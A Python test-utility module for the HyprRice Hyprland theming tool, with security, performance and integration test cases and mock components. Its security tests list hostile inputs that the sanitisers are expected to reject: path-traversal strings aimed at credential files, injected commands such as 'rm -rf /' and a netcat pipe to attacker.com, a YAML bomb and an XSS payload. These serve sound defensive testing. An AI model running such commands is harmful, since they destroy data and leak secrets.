"""
Enhanced testing infrastructure for HyprRice

Provides comprehensive testing utilities including:
- Security vulnerability testing
- Performance regression testing
- Integration testing helpers
- Mock system components
"""

import os
import sys
import time
import unittest
import pytest
import tempfile
import shutil
import subprocess
import json
import yaml
from pathlib import Path
from typing import Dict, Any, List, Optional, Callable, Generator
from unittest.mock import Mock, MagicMock, patch, call
from contextlib import contextmanager
import logging

from .config import Config
from .exceptions import HyprRiceError, SecurityError, ValidationError
from .security import input_validator, config_sanitizer
from .performance import performance_monitor, PerformanceMetrics


class SecurityTestCase(unittest.TestCase):
    """Base test case for security testing."""
    
    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp())
        self.test_config_dir = self.temp_dir / "config"
        self.test_config_dir.mkdir(parents=True)
        
    def tearDown(self):
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
    
    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        dangerous_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "../../../../root/.ssh/id_rsa",
            "~/../../../etc/hosts"
        ]
        
        for dangerous_path in dangerous_paths:
            with self.assertRaises(SecurityError):
                input_validator.validate_path(dangerous_path, self.test_config_dir)
    
    def test_command_injection_prevention(self):
        """Test command injection prevention in hyprctl commands."""
        dangerous_commands = [
            "monitors; rm -rf /",
            "workspaces && cat /etc/passwd",
            "clients | nc attacker.com 1234",
            "version `whoami`",
            "devices $(cat /etc/shadow)"
        ]
        
        from .security import sanitize_hyprctl_command
        
        for dangerous_cmd in dangerous_commands:
            with self.assertRaises(SecurityError):
                sanitize_hyprctl_command(dangerous_cmd)
    
    def test_yaml_bomb_prevention(self):
        """Test YAML bomb attack prevention."""
        yaml_bomb = """
        a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
        b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
        c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
        d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
        e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
        f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
        g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
        """
        
        yaml_file = self.temp_dir / "bomb.yaml"
        with open(yaml_file, 'w') as f:
            f.write(yaml_bomb)
        
        from .security import SecureFileHandler
        handler = SecureFileHandler()
        
        # This should either fail quickly or be handled gracefully
        with self.assertRaises((ValidationError, yaml.YAMLError)):
            handler.safe_read_yaml(yaml_file)
    
    def test_file_size_limits(self):
        """Test file size limit enforcement."""
        # Create a large file
        large_file = self.temp_dir / "large.txt"
        with open(large_file, 'w') as f:
            # Write 20MB of data
            for _ in range(20 * 1024):
                f.write("A" * 1024)
        
        with self.assertRaises(ValidationError):
            input_validator.validate_file_size(large_file, max_size=10 * 1024 * 1024)  # 10MB limit
    
    def test_config_sanitization(self):
        """Test configuration data sanitization."""
        malicious_config = {
            "name": "test\x00\x01\x02",  # Null bytes and control chars
            "command": "rm -rf /; echo 'hacked'",
            "path": "../../../etc/passwd",
            "script": "<script>alert('xss')</script>",
            "long_string": "A" * 20000  # Very long string
        }
        
        sanitized = config_sanitizer.sanitize_yaml_data(malicious_config)
        
        # Check sanitization
        self.assertNotIn("\x00", sanitized["name"])
        self.assertNotIn("\x01", sanitized["name"])
        self.assertLess(len(sanitized["long_string"]), 15000)


class PerformanceTestCase(unittest.TestCase):
    """Base test case for performance testing."""
    
    def setUp(self):
        self.performance_threshold = {
            'memory_mb': 200,  # 200MB
            'cpu_percent': 80,  # 80%
            'execution_time': 5.0  # 5 seconds
        }
    
    def assertPerformanceWithin(self, metrics: PerformanceMetrics, thresholds: Dict[str, float] = None):
        """Assert performance metrics are within acceptable thresholds."""
        thresholds = thresholds or self.performance_threshold
        
        if metrics.memory_mb > thresholds['memory_mb']:
            self.fail(f"Memory usage {metrics.memory_mb}MB exceeds threshold {thresholds['memory_mb']}MB")
        
        if metrics.cpu_percent > thresholds['cpu_percent']:
            self.fail(f"CPU usage {metrics.cpu_percent}% exceeds threshold {thresholds['cpu_percent']}%")
    
    @contextmanager
    def assertExecutionTime(self, max_time: float):
        """Context manager to assert execution time."""
        start_time = time.perf_counter()
        try:
            yield
        finally:
            execution_time = time.perf_counter() - start_time
            if execution_time > max_time:
                self.fail(f"Execution time {execution_time:.3f}s exceeds threshold {max_time}s")
    
    def test_config_loading_performance(self):
        """Test configuration loading performance."""
        # Create a large config file
        temp_dir = Path(tempfile.mkdtemp())
        try:
            config_file = temp_dir / "config.yaml"
            large_config = {
                'general': {'theme': 'dark'},
                'large_section': {f'key_{i}': f'value_{i}' for i in range(1000)}
            }
            
            with open(config_file, 'w') as f:
                yaml.dump(large_config, f)
            
            # Test loading time
            with self.assertExecutionTime(2.0):  # Should load within 2 seconds
                config = Config.load(str(config_file))
                self.assertIsInstance(config, Config)
        
        finally:
            shutil.rmtree(temp_dir)
    
    def test_memory_usage_during_operations(self):
        """Test memory usage during various operations."""
        initial_metrics = performance_monitor.get_current_metrics()
        
        # Perform memory-intensive operations
        configs = []
        for i in range(100):
            config = Config()
            configs.append(config)
        
        final_metrics = performance_monitor.get_current_metrics()
        
        # Memory increase should be reasonable
        memory_increase = final_metrics.memory_mb - initial_metrics.memory_mb
        self.assertLess(memory_increase, 50, "Memory increase too large during config creation")


class IntegrationTestCase(unittest.TestCase):
    """Base test case for integration testing."""
    
    def setUp(self):
        self.temp_dir = Path(tempfile.mkdtemp())
        self.config_dir = self.temp_dir / "config"
        self.plugins_dir = self.temp_dir / "plugins"
        self.themes_dir = self.temp_dir / "themes"
        
        for directory in [self.config_dir, self.plugins_dir, self.themes_dir]:
            directory.mkdir(parents=True)
        
        # Create mock config
        self.config = Config()
        self.config.paths.backup_dir = str(self.temp_dir / "backups")
        self.config.paths.theme_dir = str(self.themes_dir)
    
    def tearDown(self):
        if self.temp_dir.exists():
            shutil.rmtree(self.temp_dir)
    
    def create_test_plugin(self, name: str, content: str = None) -> Path:
        """Create a test plugin file."""
        if content is None:
            content = f'''
from src.hyprrice.plugins import PluginBase, PluginMetadata

class Test{name.capitalize()}Plugin(PluginBase):
    @property
    def metadata(self):
        return PluginMetadata(
            name="Test {name.capitalize()}",
            version="1.0.0",
            description="Test plugin for {name}",
            author="Test Suite"
        )
    
    def register(self, app):
        super().register(app)
        self.logger.info("Test plugin registered")

plugin_class = Test{name.capitalize()}Plugin
'''
        
        plugin_file = self.plugins_dir / f"{name}.py"
        with open(plugin_file, 'w') as f:
            f.write(content)
        
        return plugin_file
    
    def create_test_theme(self, name: str) -> Path:
        """Create a test theme file."""
        theme_data = {
            'name': name,
            'version': '1.0.0',
            'description': f'Test theme {name}',
            'colors': {
                'background': '#1e1e2e',
                'foreground': '#cdd6f4',
                'primary': '#89b4fa'
            },
            'hyprland': {
                'border_color': '#89b4fa',
                'gaps_in': 5,
                'gaps_out': 10
            }
        }
        
        theme_file = self.themes_dir / f"{name}.hyprrice"
        with open(theme_file, 'w') as f:
            yaml.dump(theme_data, f)
        
        return theme_file


class MockHyprlandEnvironment:
    """Mock Hyprland environment for testing."""
    
    def __init__(self):
        self.monitors = [
            {
                'name': 'DP-1',
                'width': 1920,
                'height': 1080,
                'x': 0,
                'y': 0,
                'scale': 1.0
            }
        ]
        
        self.workspaces = [
            {'id': 1, 'name': 'workspace1', 'monitor': 'DP-1'},
            {'id': 2, 'name': 'workspace2', 'monitor': 'DP-1'}
        ]
        
        self.windows = [
            {
                'address': '0x123456',
                'class': 'firefox',
                'title': 'Mozilla Firefox',
                'workspace': 1
            }
        ]
    
    @contextmanager
    def mock_hyprctl(self):
        """Mock hyprctl commands."""
        def mock_hyprctl_func(command: str, use_cache: bool = True):
            if 'monitors' in command:
                return json.dumps(self.monitors)
            elif 'workspaces' in command:
                return json.dumps(self.workspaces)
            elif 'clients' in command:
                return json.dumps(self.windows)
            else:
                return '{"success": true}'
        
        with patch('src.hyprrice.utils.hyprctl', side_effect=mock_hyprctl_func):
            yield


class TestRunner:
    """Enhanced test runner with additional capabilities."""
    
    def __init__(self, test_dir: str = "tests"):
        self.test_dir = Path(test_dir)
        self.logger = logging.getLogger(__name__)
        self.results = {}
    
    def run_security_tests(self) -> Dict[str, Any]:
        """Run security vulnerability tests."""
        self.logger.info("Running security tests...")
        
        loader = unittest.TestLoader()
        suite = loader.loadTestsFromTestCase(SecurityTestCase)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        self.results['security'] = {
            'tests_run': result.testsRun,
            'failures': len(result.failures),
            'errors': len(result.errors),
            'success': result.wasSuccessful()
        }
        
        return self.results['security']
    
    def run_performance_tests(self) -> Dict[str, Any]:
        """Run performance regression tests."""
        self.logger.info("Running performance tests...")
        
        loader = unittest.TestLoader()
        suite = loader.loadTestsFromTestCase(PerformanceTestCase)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        self.results['performance'] = {
            'tests_run': result.testsRun,
            'failures': len(result.failures),
            'errors': len(result.errors),
            'success': result.wasSuccessful()
        }
        
        return self.results['performance']
    
    def run_integration_tests(self) -> Dict[str, Any]:
        """Run integration tests."""
        self.logger.info("Running integration tests...")
        
        loader = unittest.TestLoader()
        suite = loader.loadTestsFromTestCase(IntegrationTestCase)
        runner = unittest.TextTestRunner(verbosity=2)
        result = runner.run(suite)
        
        self.results['integration'] = {
            'tests_run': result.testsRun,
            'failures': len(result.failures),
            'errors': len(result.errors),
            'success': result.wasSuccessful()
        }
        
        return self.results['integration']
    
    def run_all_tests(self) -> Dict[str, Any]:
        """Run all test suites."""
        self.logger.info("Running complete test suite...")
        
        # Run each test suite
        self.run_security_tests()
        self.run_performance_tests()
        self.run_integration_tests()
        
        # Calculate overall results
        total_tests = sum(r['tests_run'] for r in self.results.values())
        total_failures = sum(r['failures'] for r in self.results.values())
        total_errors = sum(r['errors'] for r in self.results.values())
        overall_success = all(r['success'] for r in self.results.values())
        
        self.results['overall'] = {
            'tests_run': total_tests,
            'failures': total_failures,
            'errors': total_errors,
            'success': overall_success
        }
        
        return self.results
    
    def generate_coverage_report(self) -> str:
        """Generate test coverage report."""
        try:
            # Run coverage analysis
            result = subprocess.run([
                'coverage', 'run', '-m', 'pytest', str(self.test_dir)
            ], capture_output=True, text=True)
            
            if result.returncode == 0:
                # Generate HTML report
                subprocess.run(['coverage', 'html'], check=True)
                return "Coverage report generated in htmlcov/"
            else:
                return f"Coverage analysis failed: {result.stderr}"
                
        except FileNotFoundError:
            return "Coverage tool not found. Install with: pip install coverage"
        except Exception as e:
            return f"Error generating coverage report: {e}"


# Utility functions for testing
def create_test_environment() -> Path:
    """Create a temporary test environment."""
    temp_dir = Path(tempfile.mkdtemp(prefix='hyprrice_test_'))
    
    # Create directory structure
    (temp_dir / 'config').mkdir()
    (temp_dir / 'plugins').mkdir()
    (temp_dir / 'themes').mkdir()
    (temp_dir / 'backups').mkdir()
    (temp_dir / 'logs').mkdir()
    
    return temp_dir


def cleanup_test_environment(test_dir: Path):
    """Clean up test environment."""
    if test_dir.exists():
        shutil.rmtree(test_dir)


@contextmanager
def temporary_test_environment():
    """Context manager for temporary test environment."""
    test_dir = create_test_environment()
    try:
        yield test_dir
    finally:
        cleanup_test_environment(test_dir)


# Pytest fixtures
@pytest.fixture
def test_config():
    """Provide a test configuration."""
    config = Config()
    config.general.theme = "test"
    return config


@pytest.fixture
def mock_hyprland():
    """Provide a mock Hyprland environment."""
    return MockHyprlandEnvironment()


@pytest.fixture
def temp_workspace():
    """Provide a temporary workspace."""
    with temporary_test_environment() as workspace:
        yield workspace


# Test discovery and execution
def discover_and_run_tests(test_dir: str = "tests", pattern: str = "test_*.py") -> int:
    """Discover and run all tests."""
    runner = TestRunner(test_dir)
    results = runner.run_all_tests()
    
    print("\n" + "="*70)
    print("TEST RESULTS SUMMARY")
    print("="*70)
    
    for suite_name, suite_results in results.items():
        if suite_name == 'overall':
            continue
            
        status = "✅ PASS" if suite_results['success'] else "❌ FAIL"
        print(f"{suite_name.upper():15} {status:8} "
              f"({suite_results['tests_run']} tests, "
              f"{suite_results['failures']} failures, "
              f"{suite_results['errors']} errors)")
    
    print("-"*70)
    overall = results['overall']
    overall_status = "✅ PASS" if overall['success'] else "❌ FAIL"
    print(f"{'OVERALL':15} {overall_status:8} "
          f"({overall['tests_run']} tests, "
          f"{overall['failures']} failures, "
          f"{overall['errors']} errors)")
    
    return 0 if overall['success'] else 1


if __name__ == "__main__":
    import sys
    sys.exit(discover_and_run_tests())
